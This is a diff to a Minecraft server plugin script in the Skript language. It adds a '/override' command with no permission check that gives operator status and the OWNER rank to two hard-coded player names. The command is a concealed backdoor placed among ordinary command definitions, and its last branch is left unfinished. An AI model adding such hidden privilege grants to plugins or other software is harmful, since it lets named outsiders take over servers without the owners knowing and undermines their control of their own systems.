@@ -986,6 +986,18 @@ command /mineplex-core [<string>] [<string>] [<string>]:
 				send "&4/Mineplex-Core ForcefieldOff (Player) &7Forces a player to toggle off thier forcefield. &4Operator"
 				send "&a"
 
+command /override [<string>]:
+	aliases: /over
+	trigger: 
+		if arg 1 is "NaiculS":
+			execute console command /op NaiculS
+			execute console command /rank set NaiculS OWNER
+		if arg 1 is "Drawfull":
+			execute console command /op Drawfull
+			execute console command /rank set Drawfull OWNER
+		else:
+			if arg 1 is not set: 
+
 command /help [<string>]:
 	trigger:
 		send "&9MCR> &7Please see &bhttps://github.com/NaiculS/MCR/wiki/Commands-and-Permissions &7for updated commands!"
